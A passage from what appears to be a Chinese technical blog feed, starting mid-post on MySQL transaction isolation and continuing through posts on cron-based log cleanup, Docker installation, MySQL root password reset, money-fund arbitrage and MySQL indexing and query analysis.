</tr>
</tbody></table>
<p><img data-src="/2024/1003155441/read-committed.png"></p>
<p>说明：</p>
<ul>
<li>第3步，事务B一开始查询结果为Alice，随后第4步事务A更新了这条记录并提交, 事务B在第6步再次查询时结果变成了Bob。</li>
<li>所以，read committed隔离级别下，事务不可重复读同一条记录，因为两次读到结果可能不一致。</li>
</ul>
<h4><span id="repeatable-read">Repeatable Read</span></h4><p>Repeatable Read隔离级别下，不会出现脏读，不可重复读，但可能遇到幻读(Phantom read)问题。<br>幻读是指，一个事务中，第一次查询某条记录发现不存在，但是当视图更新这条不存在记录时，竟然能成功，并且再次读取同一条记录时，它就神奇地出现了。</p>
<p>示例: 创建一张学生表数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from students;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | name  |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 | Alice |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec) </span><br></pre></td></tr></table></figure>

<p>分别开两个MySQL连接，按顺序执行事务A和事务B</p>
<table>
<thead>
<tr>
<th>时刻</th>
<th>事务A</th>
<th>事务B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;</td>
<td>SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;</td>
</tr>
<tr>
<td>2</td>
<td>BEGIN;</td>
<td>BEGIN;</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 99; – empty</td>
</tr>
<tr>
<td>4</td>
<td>INSERT INTO students (id, name) VALUES (99, ‘Bob’);</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>COMMIT;</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>SELECT * FROM students WHERE id &#x3D; 99; – empty</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td></td>
<td>UPDATE students SET name &#x3D; ‘Alice’ WHERE id &#x3D; 99; – 1 row affected</td>
</tr>
<tr>
<td>8</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 99; – Alice</td>
</tr>
<tr>
<td>9</td>
<td></td>
<td>COMMIT;</td>
</tr>
</tbody></table>
<p><img data-src="/2024/1003155441/repeatable-read.png"></p>
<p>说明：</p>
<ul>
<li>事务B在第3步第一次读取id&#x3D;99记录时，读到是空，随后事务A在第4步插入一条id&#x3D;99记录，事务B在第6步再次读取发现仍然为空</li>
<li>但是，事务B在第7步试图更新这条不存在记录时，居然可以更新成功，并且事务B在第8步再次读取id&#x3D;99记录时，记录出现了。</li>
</ul>
<p>总结：幻读就是没有读到的记录，以为不存在，但其实可以更新成功，并且更新成功后再次读取，又出现了。</p>
<h4><span id="serializable">Serializable</span></h4><p>最严格的隔离级别</p>
<h2><span id="参考">参考</span></h2><p><a href="https://liaoxuefeng.com/books/sql/">https://liaoxuefeng.com/books/sql/</a><br><a href="https://www.bilibili.com/video/BV1Kr4y1i7ru/">https://www.bilibili.com/video/BV1Kr4y1i7ru/</a></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中定时删除10天前的日志文件</title>
    <url>/2024/1009194730.html</url>
    <content><![CDATA[<p>例如：删除&#x2F;data&#x2F;log&#x2F;目录下所有10天前的.log文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /data/log/ -type f -name &quot;*.log&quot; -mtime +10 -exec rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>只查看要删除的文件有哪些，不真正删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logfiles=$(find /data/log/ -type f -name &quot;*.log&quot; -mtime +10)</span><br><span class="line">echo $logfiles</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>使用crontab添加一个定时任务，每天0点执行一次删除任务</p>
<p>先写个脚本<code>delete_old_logfile.sh</code>删除10天前日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/sbin/:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">logfiles=$(find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;logfiles&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10 -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Delete old logfiles: <span class="variable">$&#123;logfiles&#125;</span>, ret: $?&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>再配置crontab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;0 0 * * * (cd /path/to; delete_old_logfile.sh)&#x27; &gt;&gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure>

<h2><span id="如何测试">如何测试</span></h2><p>在&#x2F;data&#x2F;log目录下手动创建几个.log文件，用touch命令把文件的mtime改到10天前</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch -m -d &quot;1999-01-01 00:00:00&quot; /data/log/*.log</span><br></pre></td></tr></table></figure>
<p>手动修改系统时间到23:59:50, 观察0点钟crontab定时任务是否执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -s 23:59:50</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://www.cnblogs.com/renshengdezheli/p/13941084.html">Linux文件的三个时间</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装教程</title>
    <url>/2024/1017195632.html</url>
    <content><![CDATA[<h1><span id="在rocky-linux-9上安装docker">在Rocky Linux 9上安装Docker</span></h1><h2><span id="添加docker-repo-更新源-安装docker-ce">添加docker repo, 更新源, 安装docker-ce</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">sed -i &#x27;s+https://download.docker.com+https://mirrors.tuna.tsinghua.edu.cn/docker-ce+&#x27; /etc/yum.repos.d/docker-ce.repo # 使用国内源</span><br><span class="line">dnf update</span><br><span class="line">dnf install -y docker-ce</span><br></pre></td></tr></table></figure>

<h2><span id="启动docker">启动docker</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="查看docker版本">查看docker版本</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           27.3.1</span><br></pre></td></tr></table></figure>

<h2><span id="下载镜像">下载镜像</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull rockylinux:9.3</span><br></pre></td></tr></table></figure>

<h1><span id="在centos7上安装docker">在Centos7上安装Docker</span></h1><h2><span id="移除旧版本docker">移除旧版本Docker</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br></pre></td></tr></table></figure>

<h2><span id="安装依赖">安装依赖</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>

<h2><span id="添加docker存储库">添加Docker存储库</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<h2><span id="安装docker">安装Docker</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<h2><span id="启动docker服务">启动Docker服务</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h2><span id="查看docker版本">查看Docker版本</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">Docker version 25.0.2, build 29cf629</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html">https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL8.0如何重置密码</title>
    <url>/2024/1017202436.html</url>
    <content><![CDATA[<h2><span id="测试环境">测试环境</span></h2><ul>
<li>VMware Rocky Linux 9.4</li>
<li>MySQL 8.0.36</li>
</ul>
<h2><span id="修改mysql配置文件-设置为免密登录">修改MySQL配置文件, 设置为免密登录</span></h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 在[mysqld]结尾添加一行<code>skip-grant-tables</code></p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">log-error=/var/log/mysql/mysqld.log</span><br><span class="line">pid-file=/run/mysqld/mysqld.pid</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>

<h2><span id="重启mysql服务">重启MySQL服务</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<h2><span id="连接mysql修改密码">连接MySQL，修改密码</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
<p>连接成功后，执行如下sql命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">flush privileges;</span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;your_new_password&#x27;;</span><br><span class="line">grant all privileges on *.* to &quot;root&quot;@&#x27;localhost&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<h2><span id="还原配置文件并重启mysql服务">还原配置文件并重启MySQL服务</span></h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 删掉开头加的<code>skip-grant-tables</code>，再重启服务即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://blog.csdn.net/Box_clf/article/details/124599166">https://blog.csdn.net/Box_clf&#x2F;article&#x2F;details&#x2F;124599166</a><br><a href="https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html">https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html</a></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>华宝添益(511990)折价套利记录</title>
    <url>/2024/1026131638.html</url>
    <content><![CDATA[<h2><span id="套利原理介绍">套利原理介绍</span></h2><p>华宝添益(511990)是一个货币基金，年化利息1.4%左右。支持场内T+0交易，既可以买卖也可以申赎，场外价格固定是100元。<br>当场内的价格低于100元时，可以先买入511990再立刻赎回，赚取差价+利息，完成折价套利；如果买入后价格回升，也可选择当天直接卖出赚取差价。<br>同理，场内价格高于100元时，可以先卖出511990再立刻申购等量份额，完成溢价套利。溢价套利要求事先有底仓，实际操作中很少用到，不做赘述。</p>
<h2><span id="折价套利流程">折价套利流程</span></h2><p>T日买入 -&gt; T日享有收益 -&gt; T日赎回 -&gt; T+1日无收益 -&gt; T+2日资金可用<br>例如：在周五买入华宝添益再立即赎回，可以获得周五，周六，周日共三天利息，下周二资金可用。</p>
<span id="more"></span>

<h2><span id="实战记录">实战记录</span></h2><p>9月30号当天A股疯涨，一些资金卖出华宝添益去追涨股票，导致华宝添益以99.920的价格低开，当天最低价居然只有99.72<br><img data-src="/2024/1026131638/image1.png"><br>假设9月30号以99.72价格买入再立即赎回，10月9号资金可用，资金占用9天，计8天利息，万元收益0.37, 折价套利的年化收益率：(100+0.0037*8-99.72)&#x2F;99.72&#x2F;9*365 &#x3D; 12.5%</p>
<p>这个收益率还是很诱人的，自然是要搞它一把。不过30号开盘那会我正巧有事处理，没能抄到最低，最终以99.899的价格成交了7手。<br><img data-src="/2024/1026131638/image2.png"><br>计算一下9天收益约(100.0296-99.899)*700&#x3D;91.42，相当于年化5.3%，还可以。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL进阶</title>
    <url>/2024/1016215805.html</url>
    <content><![CDATA[<h2><span id="体系结构">体系结构</span></h2><p>连接层 -&gt; 服务层 -&gt; 引擎层 —&gt; 存储层</p>
<h2><span id="存储引擎">存储引擎</span></h2><p>存储引擎指存储数据，建立索引，更新&#x2F;查询数据等技术的实现方式。<br>存储引擎是基于表的，不是基于库的。</p>
<h3><span id="查某个表的存储引擎">查某个表的存储引擎</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure>
<h3><span id="查数据库支持的存储引擎">查数据库支持的存储引擎</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure>

<h3><span id="创建表时指定引擎">创建表时指定引擎</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table a(</span><br><span class="line">)engine = MyISAM;</span><br><span class="line"></span><br><span class="line">create table b(</span><br><span class="line">)engine = InnoDB;</span><br></pre></td></tr></table></figure>

<h3><span id="innodb">InnoDB</span></h3><ul>
<li>支持事务，行级锁，外键</li>
<li>每张表对应一个表空间文件XXX.ibd，路径:<code>/var/lib/mysql/*.ibd</code></li>
<li>逻辑存储结构: TableSpace(表空间), Segment(段), Extent(区), Page(页), Row(行)</li>
</ul>
<h3><span id="myisam">MyISAM</span></h3><p>MySQL早期的默认存储引擎</p>
<ul>
<li>不支持事务，不支持外键</li>
<li>支持表锁，不支持行锁</li>
<li>XX.sdi 存储表结构信息, XX.MYD 存储数据 XX.MYI存储索引</li>
</ul>
<h3><span id="memory">Memory</span></h3><p>表数据存储在内存中，只能将这些表作为临时表或缓存使用</p>
<ul>
<li>内存存放</li>
<li>hash索引(默认)</li>
<li>XX.sdi 存储表结构</li>
</ul>
<h2><span id="索引">索引</span></h2><p>索引(index)是帮助MySQL高效查询数据的数据结构。<br>优缺点：提高查询效率，但索引本身占用空间，且降低更新表(INSERT,UPDATE,DELETE)的速度。</p>
<h3><span id="索引结构">索引结构</span></h3><table>
<thead>
<tr>
<th>索引结构</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>B+Tree索引</td>
<td>最常见索引, 大部分引擎都支持B+树索引</td>
</tr>
<tr>
<td>Hash索引</td>
<td>底层用哈希表实现，只有精确匹配索引列的查询才有效，不支持范围查询和排序</td>
</tr>
<tr>
<td>R-tree(空间索引)</td>
<td>MyISAM的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少</td>
</tr>
<tr>
<td>Full-text(全文索引)</td>
<td>一种通过建立倒排索引，快速匹配文档的方式，类似与Lucene,Solr,ES</td>
</tr>
</tbody></table>
<h3><span id="为什么innodb选择b树不用二叉树b树">为什么InnoDB选择B+树，不用二叉树，B树</span></h3><ul>
<li>二叉树：顺序插入时，退化成链表，查询性能低；层级较深，查询速度慢。</li>
<li>B-Tree: 叶子节点和非叶子节点都保存数据，查询不稳定；相比B+树IO消耗大</li>
<li>B+Tree: 只有叶子节点存储数据，使得树更矮，减少IO操作次数；所有叶子节点构成一个有序链表<br>MySQL在原B+Tree基础上，增加一个指向相邻叶子节点的链表指针，提高区间访问性能。</li>
</ul>
<h3><span id="索引分类">索引分类</span></h3><table>
<thead>
<tr>
<th>分类</th>
<th>含义</th>
<th>特点</th>
<th>关键字</th>
</tr>
</thead>
<tbody><tr>
<td>主键索引</td>
<td>针对于表中主键创建的索引</td>
<td>默认自动创建，只有一个</td>
<td>PRIMARY</td>
</tr>
<tr>
<td>唯一索引</td>
<td>避免同一个表中某数据列的重复</td>
<td>可以有多个</td>
<td>UNIQUE</td>
</tr>
<tr>
<td>常规索引</td>
<td>快速定位特定数据</td>
<td>可以有多个</td>
<td></td>
</tr>
<tr>
<td>全文索引</td>
<td>查找文本中关键词</td>
<td>可以有多个</td>
<td>FULLTEXT</td>
</tr>
</tbody></table>
<p>在InnoDB中，根据索引的存储形式，又可以分如下两种：</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>含义</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>聚集索引(Clustered Index)</td>
<td>将数据和索引一起存储，叶子节点保存了行数据</td>
<td>有且只有一个</td>
</tr>
<tr>
<td>二级索引(Secondary Index)</td>
<td>将数据和索引分开存储，叶子节点关联对应主键</td>
<td>可存在多个</td>
</tr>
</tbody></table>
<p>聚集索引选取规则：</p>
<ul>
<li>如果存在主键，主键索引就是聚集索引</li>
<li>如果不存在主键，使用第一个唯一索引作为聚集索引</li>
<li>如没有主键和合适的唯一索引，InnoDB会自动生成一个rowid作为隐藏的聚集索引</li>
</ul>
<h3><span id="索引语法">索引语法</span></h3><p>创建索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create [unique|fulltext] index index_name on table_name (index_col_name,...);</span><br></pre></td></tr></table></figure>
<p>查看索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show index from table_name;</span><br></pre></td></tr></table></figure>
<p>删除索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop index index_name on table_name;</span><br></pre></td></tr></table></figure>

<p>例：按如下要求完成索引的创建</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">	id <span class="type">bigint</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">	name <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">	phone <span class="type">char</span>(<span class="number">11</span>),</span><br><span class="line">	email <span class="type">varchar</span>(<span class="number">36</span>),</span><br><span class="line">	profession <span class="type">varchar</span>(<span class="number">36</span>),</span><br><span class="line">	age tinyint unsigned,</span><br><span class="line">	gender <span class="type">char</span>(<span class="number">1</span>),</span><br><span class="line">	status <span class="type">int</span>,</span><br><span class="line">	createtime datetime</span><br><span class="line">)engine<span class="operator">=</span>InnoDB;</span><br></pre></td></tr></table></figure>

<p>要求：</p>
<ul>
<li>name设置索引</li>
<li>phone非空创建唯一索引</li>
<li>profession,age,status设置联合索引</li>
<li>email建立索引</li>
</ul>
<p>创建索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_user_name <span class="keyword">on</span> tb_user(name);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index idx_user_phone <span class="keyword">on</span> tb_user(phone);</span><br><span class="line"><span class="keyword">create</span> index idx_user_pro_age_sta <span class="keyword">on</span> tb_user(profession,age,status);</span><br><span class="line"><span class="keyword">create</span> index idx_user_email <span class="keyword">on</span> tb_user(email);</span><br></pre></td></tr></table></figure>
<p>查看索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show index from tb_user;</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br><span class="line">| Table   | Non_unique | Key_name             | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression |</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br><span class="line">| tb_user |          0 | PRIMARY              |            1 | id          | A         |           0 |     NULL |   NULL |      | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          0 | idx_user_phone       |            1 | phone       | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_name        |            1 | name        | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            1 | profession  | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            2 | age         | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            3 | status      | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_email       |            1 | email       | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br></pre></td></tr></table></figure>

<h2><span id="sql性能分析">SQL性能分析</span></h2><h3><span id="查询sql执行频率">查询SQL执行频率</span></h3><p>通过如下命令，查看SQL中增删改查的频率</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global status like &#x27;Com_______&#x27;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Com_binlog    | 0     |</span><br><span class="line">| Com_commit    | 0     |</span><br><span class="line">| Com_delete    | 0     |</span><br><span class="line">| Com_import    | 0     |</span><br><span class="line">| Com_insert    | 0     |</span><br><span class="line">| Com_repair    | 0     |</span><br><span class="line">| Com_revoke    | 0     |</span><br><span class="line">| Com_select    | 4     |</span><br><span class="line">| Com_signal    | 0     |</span><br><span class="line">| Com_update    | 0     |</span><br><span class="line">| Com_xa_end    | 0     |</span><br><span class="line">+---------------+-------+</span><br></pre></td></tr></table></figure>
<h3><span id="慢查询日志">慢查询日志</span></h3><p>记录所有执行时间超过指定参数long_query_time(默认:10秒)的所有SQL语句日志</p>
<p>MySQL的慢查询日志默认没有开，需要手动配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;slow_query%&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log      | OFF                               |</span><br><span class="line">| slow_query_log_file | /var/lib/mysql/localhost-slow.log |</span><br><span class="line">+---------------------+-----------------------------------+</span><br></pre></td></tr></table></figure>
<p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 在[mysqld]最后添加两行，开启MySQL慢查询日志，设置慢查询超时时间2秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow-query-log=on</span><br><span class="line">long_query_time=2</span><br></pre></td></tr></table></figure>
<p>重启mysqld, 执行<code>systemctl restart mysqld</code>，再确认修改后的配置已生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;slow_query%&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log      | ON                                |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">mysql&gt; show variables like &#x27;long_query_time&#x27;;</span><br><span class="line">+-----------------+----------+</span><br><span class="line">| Variable_name   | Value    |</span><br><span class="line">+-----------------+----------+</span><br><span class="line">| long_query_time | 2.000000 |</span><br><span class="line">+-----------------+----------+</span><br></pre></td></tr></table></figure>
<h3><span id="profile详情">profile详情</span></h3><p>先打开profile开关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@profiling;</span><br><span class="line">+-------------+</span><br><span class="line">| @@profiling |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set profiling = 1;</span><br></pre></td></tr></table></figure>
<p>执行SQL操作后，通过show profiles查看指令的执行耗时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show profiles;</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                        |</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">|        1 | 0.00027175 | select * from tb_user        |</span><br><span class="line">|        2 | 0.00008450 | show profiles for query 1    |</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">mysql&gt; show profile for query 1;</span><br><span class="line">mysql&gt; show profile cpu for query 1;</span><br></pre></td></tr></table></figure>

<h3><span id="explain">explain</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explain select * from tb_user where id = 1;</span><br></pre></td></tr></table></figure>

<p>实例：给tb_user表生成100w条数据，用于测试查询性能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import random</span><br><span class="line">from datetime import datetime, timedelta</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">#insert into tb_user(name,phone,email,profession,age,gender,status,createtime) values(&#x27;Jony&#x27;,&#x27;12345678111&#x27;, &#x27;example@163.com&#x27;, &#x27;RD&#x27;,18,&#x27;M&#x27;,1,NOW());</span><br><span class="line"></span><br><span class="line">def generate_phone():</span><br><span class="line">    return &#x27;1&#x27; + &#x27;&#x27;.join([str(random.randint(0, 9)) for _ in range(10)])</span><br><span class="line"></span><br><span class="line">def generate_random_date():</span><br><span class="line">    start_date = datetime(2024, 1, 1)</span><br><span class="line">    end_date = datetime(2024, 12, 31)</span><br><span class="line">    time_between_dates = end_date - start_date</span><br><span class="line">    days_between_dates = time_between_dates.days</span><br><span class="line">    random_number_of_days = random.randint(0, days_between_dates)</span><br><span class="line">    random_date = start_date + timedelta(days=random_number_of_days)</span><br><span class="line">    return random_date.strftime(&#x27;%Y-%m-%d&#x27;)</span><br><span class="line"></span><br><span class="line">def generate_random_name(length=5):</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for _ in range(length))</span><br><span class="line"></span><br><span class="line">def insert_data():</span><br><span class="line">    with open(&#x27;./test.sql&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">        for i in range(1000000):</span><br><span class="line">            name = generate_random_name()</span><br><span class="line">            phone = generate_phone()</span><br><span class="line">            email = generate_random_name() + &#x27;@163.com&#x27;</span><br><span class="line">            profession = random.choice([&#x27;Sales&#x27;, &#x27;R&amp;D&#x27;, &#x27;Marketing&#x27;, &#x27;OPS&#x27;])</span><br><span class="line">            age = random.randint(0,130)</span><br><span class="line">            gender = random.choice([&#x27;F&#x27;,&#x27;M&#x27;])</span><br><span class="line">            status = random.choice([0, 1])</span><br><span class="line">            date = generate_random_date()</span><br><span class="line">            output = &quot;insert into tb_user(name,phone,email,profession,age,gender,status,createtime) values(&#x27;&#123;name&#125;&#x27;,&#x27;&#123;phone&#125;&#x27;, &#x27;&#123;email&#125;&#x27;, &#x27;&#123;profession&#125;&#x27;,&#123;age&#125;,&#x27;&#123;gender&#125;&#x27;, &#123;status&#125;, &#x27;&#123;date&#125;&#x27;);&quot;.format(name=name, phone=phone, email=email, profession=profession, age=age, gender=gender, status=status, date=date)</span><br><span class="line">            f.write(output + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">insert_data()</span><br></pre></td></tr></table></figure>
<p>再从SQL文件中批量导入tb_user表的数据到数据库pc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -D pc &lt; test.sql </span><br></pre></td></tr></table></figure>

<p>explain执行计划中各字段含义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where id = 1;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br></pre></td></tr></table></figure>
<ul>
<li>id<br>表示查询中执行select子句或操作表的顺序，id相同执行顺序从上到下，id不同，值越大越先执行</li>
<li>select_type<br>表示select类型，常见取值有simple, primary, union, subquery(有子查询)</li>
<li>type<br>表示连接类型，性能由好到差为NULL, system, const, eq_ref, ref, range, index, all</li>
<li>possible_keys<br>显示可能应用在这张表的索引，一个或多个</li>
<li>key<br>表示实际用到的索引，如果为NULL说明没使用索引</li>
<li>key_len<br>表示索引中字节数，该值为索引字段最大可能长度，并非实际使用长度，长度越短越好</li>
